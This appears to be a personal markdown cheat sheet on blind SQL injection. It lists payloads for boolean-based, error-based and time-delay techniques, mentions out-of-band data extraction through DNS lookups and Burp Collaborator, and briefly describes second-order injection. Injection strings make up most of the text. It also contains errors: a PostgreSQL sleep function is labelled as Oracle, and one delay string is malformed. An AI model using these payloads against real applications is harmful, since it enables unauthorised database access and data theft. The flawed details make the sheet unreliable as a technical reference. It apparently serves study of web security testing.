### how to exploit 
1. change logic of the Query to trigger detectable difference
2. trigger time delay
3. trigger out of band network interaction

### using conditional Response
```bash
Query = ' xyz AND "1"="1' 
```
**if get response than xyz if true other wise it DIDN'T get response from server**    or
```bash
Query = ' xyz AND "1"="2'
```

### inducing conditional Response by Triggering SQL Error
```bash
Query = 'xyz AND ( Select CASE WHEN (1=2) Then 1/0 Else "a" END)="a'
```
**if condition is true server gives us the error if false 
coudnt get error**

##### for Oracle Data base 
```bash
Query= 'xyz \|\| (select case when(1=1) Then To_char(1/0) Else '' END From DUAL \|\| '
```

### exploit BY Generating Delay 
```bash
query = '; if (condition true) waitfor Delay '0:0:10:'+--+'
```
gives 10 second delay in response if condition true else DIDN'T delay in response

##### for oracle DB
```bash
Query = '\|\| pg_sleep(delay in seconds)+--+'
```

### exploit using OUt of band 
in this append data in the form of subdomain in our domain and make a DNS lookup
that will reflect in our network traffic and that way we can extract data.
we also use burp collaberator

## 2nd Order SQL Injection
#### it happens when our input stored in the application and then later handling different HTTP request the app retrieve stored data and our sql query is executed and we successfully u injected our payload in the server and also executed our SQL Query.